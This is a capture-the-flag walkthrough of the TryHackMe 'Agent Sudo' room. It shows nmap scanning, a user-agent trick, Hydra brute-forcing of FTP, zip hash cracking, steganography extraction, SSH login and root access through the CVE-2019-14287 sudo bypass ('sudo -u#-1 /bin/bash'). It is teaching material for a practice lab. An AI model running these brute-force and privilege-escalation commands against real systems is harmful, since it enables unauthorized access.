# [Agent Sudo](https://tryhackme.com/room/agentsudoctf)

## You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

# Enumerate

## Enumerate the machine and get all the important information

### How many open ports?

1. First, let's scan for open ports using Nmap to identify potential entry points
   - Running a basic Nmap scan reveals **3** open ports on the target system

```bash
nmap IP
```

[SCREEN01]

### How you redirect yourself to a secret page?

1. When visiting the web server at `http://IP:80`, we find a message that provides a hint
   - The welcome page indicates we need to change our **user-agent** to access the secret page

[SCREEN03]

### What is the agent name?

1. Based on the hint that it's agent "C", we can modify our HTTP request with the appropriate user-agent
   - Using curl with a custom user-agent "C" reveals the agent's name is **chris**

```bash
curl -A "C" -L http://IP//
```

- `-A`: flag sets the user-agent
- `-L`: flag follows redirects

[SCREEN02]

# Hash cracking and brute-force

## Done enumerate the machine? Time to brute your way out.

### FTP password

1. Since we discovered the username "chris", we can attempt to brute force the FTP service using Hydra

```bash
hydra -l chris -P /root/Tools/wordlists/rockyou.txt ftp://IP
```

[SCREEN04]

### Zip file password

1. After successfully gaining FTP access, we download all available files for analysis

```bash
ftp IP
# Enter username: chris
# Enter password: [discovered password]

ls -la
get To_agentJ.txt cutie-alien.jpg cutie.png
```

[SCREEN05]

2. Examining the `To_agentJ.txt` file reveals we need to extract hidden data from the images
   - First, we use binwalk to check for embedded files in the PNG image

```bash
binwalk -e cutie.png
```

3. Next, we need to crack the password of the extracted zip file:

```bash
zip2john 8702.zip > hash.txt
john hash.txt
```

[SCREEN06]

### steg password

1. Inside the extracted `8702.zip` file, we find a file containing the Base64 encoded string **QXJlYTUx**
   - Decoding this string gives us "Area51", which is the steganography password for the other image

[SCREEN07]

### Who is other agent (in full name)?

### SSH password

1. Using the password "Area51", we can extract hidden data from the second image using steghide

```bash
steghide extract -sf cute-alien.jpg
# Enter passphrase: Area51
```

[SCREEN08]

2. The extracted `message.txt` contains the full name of the other agent (**James**) and his SSH password

[SCREEN09]

# Capture the user flag

## You know the drill

### What is the user flag?

1. Login to the target machine using the discovered SSH credentials

```bash
ssh james@IP
# Enter password: [discovered password]

ls
cat user_flag.txt
```

[SCREEN10]

### What is the incident of the photo called?

1. Transfer file to our local machine for analysis

```bash
scp james@10.10.102.224:Alien_autospy.jpg .
```

2. After examining the image and researching online, we identify the incident as the famous **Roswell alien autopsy**

[SCREEN11]

# Privilege escalation

## Enough with the extraordinary stuff? Time to get real

### CVE number for the escalation

1. First, we check what sudo privileges James has on the system

```bash
sudo -l
```

[SCREEN12]

2. The output shows James can run `/bin/bash` as anyone except root

   - Researching this pattern on Google with "sudo ALL, !root exploit db" leads us to [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)

3. Exploiting the vulnerability using the documented technique

```bash
sudo -u#-1 /bin/bash
```

### What is the root flag?

### Who is Agent R?

1. The `root.txt` file contains both the flag and reveals Agent R name

```bash
cd /root
cat root.txt
```

[SCREEN13]
